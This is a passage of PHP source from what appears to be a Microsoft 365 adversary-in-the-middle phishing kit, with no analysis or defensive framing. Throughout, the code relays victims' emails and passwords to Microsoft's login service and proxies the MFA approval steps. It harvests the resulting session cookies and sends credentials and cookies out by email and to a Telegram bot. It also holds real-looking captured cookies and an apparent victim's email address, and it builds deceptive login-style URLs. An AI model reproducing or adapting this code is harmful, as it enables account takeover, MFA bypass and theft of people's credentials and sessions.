    $data = 'i13=0&login='.$email.'&loginfmt='.$email.'&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd='.$password.'&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary='.$token['canary'].'&ctx='.$token['ctx'].'&hpgrequestid='.$token['hpgrequestid'].'&flowToken='.$token['flowToken'].'&PPSX=&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&i19=318945';

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://login.microsoftonline.com/common/login');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 9; SM-G965N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Accept-Encoding: gzip, deflate, br';
$headers[] = 'Referer: https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office365.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=844b5922-9c5a-8a33-aa0f-db95d3973a9f&protectedtoken=true&claims=%7b%22id_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&login_hint=dan%40shermanactuary.com&nonce=638250338502447720.5b5be68e-60ab-47db-abe1-0b4d6808c4c8&state=Dcs7FoAgDADBoM_jRCLkdx0C1JZe3xSz3RYAONORCmXAtHsT6t2FGrNZo1tCYqtvVBqBbCtwxH6Qgpc6-eTpJd-rvt-oPw';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://login.microsoftonline.com';
$headers[] = 'Dnt: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Cookie: buid=0.AREAMe_N-B6jSkuT5F9XHpElWtYOWdOzUgJBrv-q0ikqsBwBAAA.AQABAAEAAAD--DLA3VO7QrddgJg7WevrkE9yVJ0cTURvCqJXziQOG3lBv9sajcjM0AKdWxryitqdKe75oTaxP0TeGU9tt4hYjW5ekvXELt2_pYadtkbKQBxeHH0jQAfsAwbw36ygC_UgAA; esctx=PAQABAAEAAAD--DLA3VO7QrddgJg7WevrH343UW5PSxMm7wEDKyKXBc-XN5S1z4-1vjvpC1d1AVca1-sKIYexUmG0yyonb-Q1pF2Yl84QNu9XSIsSvqGULFoZy1y9zxhZBXlTO5NSKoJkOJ0CmOcOlMid3LxqK5-ciintKzW04OUPvUtL8GrHT0BkivavtDLtem22tEMaZyImoJi75WimzVgFmovgbbGRKR97coOcVKP0lQZrtwYdYPmv7o6o6EimyO2OT-Zn0-cgAA; fpc=As2MbrYlWQtEl0yMgvuqcmzKQgWhAQAAAISTR9wOAAAA; x-ms-gateway-slice=estsfd; stsservicecookie=estsfd; MicrosoftApplicationsTelemetryDeviceId=7cf3c449-c5d5-4d31-860c-bf0db9b35f20; brcap=1; ai_session=KI+Mz4ocfPllWJ0R8oBgoG|1689623725249|1689623725249; wlidperf=FR=L&ST=1689624036435';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'Sec-Fetch-Dest: document';
$headers[] = 'Sec-Fetch-Mode: navigate';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-User: ?1';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);



    $result = curl_exec($ch);
    $json = Mid($result, '$Config=', ';');
    $json = json_decode($json, true);

    $ClientId = Mid($result, 'client-request-id', '"');


    $ctx = $json['sCtx'];

    $flowToken = $json['sFT'];

    $hpgrequestid = $json['sessionId'];

    $canary = ($json['canary']);

    curl_close($ch);
    // var_dump($result);


    if (strpos($result, 'access_denied') !== false) {
        sendEmailResult($email, $password, '');
        return ['status' => 'error', 'message' => 'Your account or password is incorrect'];
    } else {
        preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $result, $cookies);

        $list = [];
        foreach ($cookies[1] as $cookie) {
            $jsonCookie = cookieToJSON($cookie, 'login.microsoftonline.com');
            array_push($list, $jsonCookie);
        }

        $esctx = $list[array_search('esctx', array_column($list, 'name'))]['value'];
        $ESTSAUTHPERSISTENT = $list[array_search('ESTSAUTHPERSISTENT', array_column($list, 'name'))]['value'];
        $ESTSAUTH = $list[array_search('ESTSAUTH', array_column($list, 'name'))]['value'];
        $ESTSAUTHLIGHT = $list[array_search('ESTSAUTHLIGHT', array_column($list, 'name'))]['value'];
        $ch = $list[array_search('ch', array_column($list, 'name'))]['value'];
        $ESTSSC = $list[array_search('ESTSSC', array_column($list, 'name'))]['value'];
        $buid = $list[array_search('buid', array_column($list, 'name'))]['value'];
        $fpc = $list[array_search('fpc', array_column($list, 'name'))]['value'];

        // $headerCookie = 'esctx=' . $esctx . '; ESTSAUTHPERSISTENT=' . $ESTSAUTHPERSISTENT . '; ESTSAUTH=' . $ESTSAUTH . '; ESTSAUTHLIGHT=' . $ESTSAUTHLIGHT . '; ch=' . $ch . '; ESTSSC=' . $ESTSSC . '; buid=' . $buid . '; fpc=' . $fpc . ';';
        
        $headerCookie = 'esctx=' . $esctx . '; ESTSAUTHPERSISTENT=' . $ESTSAUTHPERSISTENT . '; ESTSAUTHLIGHT=' . $ESTSAUTHLIGHT . '; ch=' . $ch . '; ESTSSC=' . $ESTSSC . '; buid=' . $buid . '; fpc=' . $fpc . ';';

        if (isset($json['arrUserProofs'])) {
            $tokenToRetrun = [
            'ctx' => $ctx,

            'flowToken' => $flowToken,

            'hpgrequestid' => $hpgrequestid,

            'canary' => $canary,

            'client-request-id' => $ClientId,

            'cookie' => $headerCookie
            ];

            sendEmailResult($email, $password, '');

            return [
                'status' => 'verify',
                'message' => 'Please verify your account',
                'data' =>base64_encode(json_encode($tokenToRetrun)),
                'method' => base64_encode(json_encode($json['arrUserProofs'])),
                'key' => base64_encode($password),
            ];
        }
      

        sendEmailResult(json_encode($list, JSON_PRETTY_PRINT));
        $WOLFCookiee = json_encode($list,JSON_PRETTY_PRINT);
        $WOLFFolder = "C0ck3!i";
        $WOLFSession = fopen($WOLFFolder . '5.txt', 'w+');
        $WOLFMessage = ' ' . PHP_EOL;
        fwrite($WOLFSession,$WOLFMessage.$WOLFCookiee);
        WOLFSendResultAsFileToTelegramBot();
        // sendDiscordResult(json_encode($list, JSON_PRETTY_PRINT));
        




        return ['status' => 'success', 'message' => 'Login success'];

    }

}


function beginAuthOffice($method, $ctx, $flowToken, $canary, $cookie)

{

    $data = [

        "AuthMethodId" => $method,

        "Method" => "BeginAuth",

        "ctx" => $ctx,

        "flowToken" => $flowToken,

    ];



    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, 'https://login.microsoftonline.com/common/SAS/BeginAuth');

    curl_setopt($ch, CURLOPT_POST, 1);

    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);



    $headers = array();

    $headers[] = "Host: login.microsoftonline.com";

    $headers[] = "Cookie: " . $cookie;

    $headers[] = "Hpgrequestid: 74d668b1-e9cf-457d-8562-8c60ed573a00";

    $headers[] = "User-Agent: Mozilla/5.0 (Linux; Android 9; google Pixel 2 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36 PKeyAuth/1.0";

    $headers[] = "Client-Request-Id: 12dfd683-3e62-4c92-9421-85e9fe011d3c";

    $headers[] = "Canary: " . $canary;

    $headers[] = "Content-Type: application/json; charset=UTF-8";

    $headers[] = "Accept: application/json";

    $headers[] = "Origin: https://login.microsoftonline.com";

    $headers[] = "Referer: https://login.microsoftonline.com/common/login";

    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);



    $result = curl_exec($ch);

    $json = json_decode($result, true);

    curl_close($ch);

    return $json;

}



function EndAuthOffice($token, $otc = null)

{

    $token = json_decode(base64_decode($token), true);



    $data = [

        "Method" => "EndAuth",

        "SessionId" => $token['session'],

        "FlowToken" => $token['flowToken'],

        "Ctx" => $token['ctx'],

        "AuthMethodId" => $token['method']

    ];



    if ($otc != null) {

        $data['AdditionalAuthData'] = $otc;

    }



    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, 'https://login.microsoftonline.com/common/SAS/EndAuth');

    curl_setopt($ch, CURLOPT_POST, 1);

    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);



    $headers = array();

    $headers[] = "Host: login.microsoftonline.com";

    $headers[] = "Cookie: " . $token['cookie'];

    $headers[] = "Hpgrequestid: 74d668b1-e9cf-457d-8562-8c60ed573a00";

    $headers[] = "User-Agent: Mozilla/5.0 (Linux; Android 9; google Pixel 2 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36 PKeyAuth/1.0";

    $headers[] = "Client-Request-Id: 12dfd683-3e62-4c92-9421-85e9fe011d3c";

    $headers[] = "Content-Type: application/json; charset=UTF-8";

    $headers[] = "Accept: application/json";

    $headers[] = "Origin: https://login.microsoftonline.com";

    $headers[] = "Referer: https://login.microsoftonline.com/common/login";

    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);



    $result = curl_exec($ch);

    $json = json_decode($result, true);

    curl_close($ch);

    return $json;

}



function processAuthOffice($token, $user, $cookie, $password)

{

    $data = "type=22&request=" . $token['Ctx'] . "&mfaLastPollStart=1662311234026&mfaLastPollEnd=1662311235098&mfaAuthMethod=PhoneAppNotification&canary=pe%2BxBLVFJ%2FjKv8BG0IiuOU3ZOFZVmNqkpQW89jy9i70%3D3%3A1&login=$user&flowToken=" . $token['FlowToken'] . "&hpgrequestid=6978818c-50db-4619-9851-80413a8a1500&sacxt=&hideSmsInMfaProofs=false&i19=8628";



    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, 'https://login.microsoftonline.com/common/SAS/ProcessAuth');

    curl_setopt($ch, CURLOPT_POST, 1);

    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    curl_setopt($ch, CURLOPT_HEADER, 1);

    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');



    $headers = array();

    $headers[] = "Host: login.microsoftonline.com";

    $headers[] = "Cookie: brcap=0; MSFPC=GUID=d7fdec5542ee4beb8b37552301cbaec0&HASH=d7fd&LV=202209&V=4&LU=1662225774046; CCState=Q29NQkNoQnFiMmh1UUhOaGRXbHNiSE11WTI5dEVnRUJJZ2tKZ0wvNTlmR0gya2dxQ1FrL0Zmc09yWlhhU0RJcUNoSUtFRnRFWlVmR01yQkpnK1lkazNaU2Rzb1NDUWxlS1RnekxKRGFTQm9KQ1QrVjJXYlJqZHBJT0FCSUFGSVNDaERnNWVtbzVoY0hUWXIrMitJZGQ4SzRXaElLRUZ5aFFTOEJJUmhPbUx1MUE5dTZjVjBTRWdvUW9vZTVQVVY2MDBha3dqZnRrMXVqRHhvSkNUK1YyV2JSamRwSU1uNENBQUVBQVFBQUFQNzRNc0RkVTd0Q3QxMkFtRHRaNitzQ0FPei9CQUQwL3dmbDd5M1NNbmpHMWxKbyt3WGxKTmtZNnlXeUd1TEJiT0tDYk81ZDB1eEJMc2VEOWJFek03dCt0ek54QWxPUXhXSDNTOXF1dGx3VnpKT0ltaGZnRW9wSDNaVXk1Mjh1aFUwL2VQVThjYitHSUIrNHJvM25NbEZSemxnUklTWT0=; x-ms-gateway-slice=estsfd; stsservicecookie=estsfd; AADSSO=NA|NoExtension; SSOCOOKIEPULLED=1; ESTSSC=00; esctx=AQABAAAAAAD--DLA3VO7QrddgJg7WevrDJsdUvtAMIIKpxic6oRJN-D5orY750M7PQiT2BlhtW6bDLudo7-lC6ERQGQlo3lxwUwlT-Kft2NBgvo0ENDhNbLSzdZgmqKZ3wy4jTNBcss4H-vjYxJ_YNZMcefNqxb4L31vcHgmYicGnCQs3eN2UEoqnPuLMCXG3ASig4CrkCsgAA; wlidperf=FR=L&ST=1662311232220; ESTSAUTHPERSISTENT=0.ARIA4OXpqOYXB02K_tviHXfCuPfhvoluXopNnz3s1gElnacSAAU.AgABAAQAAAD--DLA3VO7QrddgJg7WevrAgDs_wQA9P_4xckuayWJFp0w5QZix6y_Sm74SqzzYfhd8uosiUJbT7tOAG-cbnl7hK-wh071cH43XAag9nqqss9n7FNYv4cbLfVRE_LBZlMPvHZ4SZdpMyJulxdY7k1nw4elR9NEeSKBuonSpHPLucj5Q5yrhc2G345LVY9i5EZ6tibQGoul0LMF6NF9eDhIjG4-4P-w4aquIyWiMZ6PyCv2F9zz7rHAqdFAC5_VdBYteVSIlBPMndnnWKGOmCTJqtfBvH3asrBUbpsdipUW-gnCn9PGvYebTZi4yBOyshj6_WgZcy_kBn1wLIH_YDTQbqaacQUgatl9MkH8h626oIJaamytkuaR9qYrDvAt1ZYgue9uObu-eZN1DzWLntix; ESTSAUTH=0.ARIA4OXpqOYXB02K_tviHXfCuPfhvoluXopNnz3s1gElnacSAAU.AgABAAQAAAD--DLA3VO7QrddgJg7WevrAgDs_wQA9P9IYfEsjJexvM1d6CLyKOa0ow18O8cPyiWXwPsNtmReB8gpZV5hzbEeeTue4HteIJKP07hBQzLAev6TkLV9DHLThqIh4zGXIT-GPJ5zP4SfzjYMLBXYsHVHEQ3bdgQjpIdnh_6wPGHpCrwu8h2YBiFRxMjhhAB4i3SPIiEto2T-2DtXcoaY936lrbfmMfqg0wVWhpPeyrmBrBvA1FZLTlIJ1Z3YL0k_MWC8Zv__jh_1eAy8z2ZVjX6EZpFAtn5OqZ2LzIi8qNv4aQ6pRW5KD7VqaZ8uKYQHg4DI8B2_uADa-d4VPNSvUwKD30s1hCj5DbvQUt-c_F-aGW5wTZJkES7LyYVjJuuxZERlswCjHwOaEmJrlJoblIOAykz4skOffVJE_ekp1w6qJagtae8H7qebMlPo2Qj7O5OMSg24mdAk0MqbBWKpJWKI2v2HeuKMUC0aMqmq-xP5WRsN9_y7K-LxMCtbyB4uFJUDJz_Z3hu-iwy4pnyAfkVVNxtea5kZlJnKIchGZRVjntLDVg; ESTSAUTHLIGHT=+0c7344a4-cc75-4470-9e68-42ed0e249b97; ch=sWoYrXTBEGTgaH81rGKaUXvSNiLDFM5IfDL5l4OQLYg; buid=0.ARIA4OXpqOYXB02K_tviHXfCuPfhvoluXopNnz3s1gElnacSAAU.AQABAAEAAAD--DLA3VO7QrddgJg7Wevrj63P8tkUhjB64FIPNC0snFnzFRxs65oN2dIEFiA1QgbebGgO7kc5CP68liuaotNl4d4uwUbwNf8nsE0CzQzfeYuKQm4efW76XwonEe906w1JufUCuYHrH_58CZ_sMOzGwA9diN7sHW1gWn8r0-BLNBfwE0_pdGZgXYUFbNnyG84gAA; fpc=AnyKzz8Ge9FPhKiOIdELYl-8Ae7AAQAAACLSptoOAAAAj_JLAwEAAABB0qbaDgAAAA; clrc={%2219239%22%3a[%227CVOb+CW%22]%2c%2219240%22%3a[%22CWt5gt66%22%2c%22VmPIPHJh%22%2c%22+SjF/0ga%22]}";

    $headers[] = "Hpgrequestid: 74d668b1-e9cf-457d-8562-8c60ed573a00";

    $headers[] = "User-Agent: Mozilla/5.0 (Linux; Android 9; google Pixel 2 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36 PKeyAuth/1.0";

    $headers[] = "Content-Type: application/x-www-form-urlencoded";

    $headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";

    $headers[] = "Origin: https://login.microsoftonline.com";

    $headers[] = "Referer: https://login.microsoftonline.com/common/login";

    $headers[] = "Accept-Language: en-US,en;q=0.9";

    $headers[] = "Accept-Encoding: gzip, deflate";

    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);



    $result = curl_exec($ch);

    curl_close($ch);



    preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $result, $cookies);



    $list = [];

    foreach ($cookies[1] as $cookie) {

        $jsonCookie = cookieToJSON($cookie, 'login.microsoftonline.com');

        array_push($list, $jsonCookie);

    }



    sendEmailResult(json_encode($list, JSON_PRETTY_PRINT));
    $WOLFCookiee = json_encode($list,JSON_PRETTY_PRINT);
    $WOLFFolder = "C0ck3!i";
    $WOLFSession = fopen($WOLFFolder . '5.txt', 'w+');
    $WOLFMessage = ' ' . PHP_EOL;
    fwrite($WOLFSession,$WOLFMessage.$WOLFCookiee);
    WOLFSendResultAsFileToTelegramBot();
    // sendDiscordResult(json_encode($list, JSON_PRETTY_PRINT));

           



    return $result;

}


//end

$_SESSION['mize'] = rand(100000000,999999999);
$_SESSION['token'] = sha1(session_id());
$_SESSION['cage'] = substr(sha1(mt_rand()),1,25);
//$or=rand(0, 1);
$id = sha1(session_id());
$sha1 = substr(sha1(mt_rand()),1,25);
$lockup = rand(100000000,999999999); // Replace any word on the string to lockup your page
$string = strtoupper(chr(rand(65, 90)) . chr(rand(65, 90)) . rand(100, 999));
 //echo $string;



$priv8 ="login.live.com/../_/4tt3m9t?https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=".sha1(session_id()).'&ai='.sha1(base64_encode($ip2.$userAgent.$block_ua.$id.$sha1.$lockup));
$priv7 ="login.office.com/../_/l0g1n0?https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=".sha1(session_id()).'&ai='.sha1(base64_encode($ip2.$userAgent.$block_ua.$id.$sha1.$lockup));
$priv6 ="../_/p4s5w0rd?https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=".sha1(session_id()).'&='.sha1(base64_encode($ip2.$userAgent.$block_ua.$id.$sha1.$lockup));
$priv5 ="../_/5ucc4s5?https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=".sha1(session_id()).'&='.sha1(base64_encode($ip2.$userAgent.$block_ua.$id.$sha1.$lockup));
$priv0 ="login.office.com/../_/p4s5w0rd?https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=".sha1(session_id()).'&ai='.sha1(base64_encode($ip2.$userAgent.$block_ua.$id.$sha1.$lockup));
$priv4 ="../_/c00K!3?https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=".sha1(session_id()).'&='.sha1(base64_encode($ip2.$userAgent.$block_ua.$id.$sha1.$lockup));
$priv3 ="../_/f1n4l?https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=".sha1(session_id()).'&='.sha1(base64_encode($ip2.$userAgent.$block_ua.$id.$sha1.$lockup));
$priv2 ="../f1n4i?https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=".sha1(session_id()).'&='.sha1(base64_encode($ip2.$userAgent.$block_ua.$id.$sha1.$lockup));
$priv1 ="../f1n4i/?https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=".sha1(session_id()).'&='.sha1(base64_encode($ip2.$userAgent.$block_ua.$id.$sha1.$lockup));



